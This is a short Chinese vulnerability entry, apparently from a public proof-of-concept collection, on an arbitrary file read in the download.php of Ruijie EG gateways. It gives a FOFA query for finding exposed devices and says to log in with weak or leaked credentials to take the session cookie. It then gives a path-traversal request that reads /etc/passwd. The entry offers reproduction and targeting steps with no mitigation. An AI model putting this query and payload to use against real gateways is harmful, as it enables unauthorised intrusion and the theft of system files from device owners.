# 锐捷EG易网关download.php后台任意文件读取漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷EG易网关download.php后台任意文件读取漏洞 </font>

**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

锐捷 EG易网关  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**  
<font style="color:rgb(38, 38, 38);">●登录页面</font>

<font style="color:rgb(38, 38, 38);">fofa:</font>`app="Ruijie-EG易网关" `


  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1通过弱口令或账号密码泄露漏洞登录后台获取cookie  


2通过上一步获取的cookie执行

```plain
/download.php?a=read_txt&file=../../../../etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ecv5820erlgsur8o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
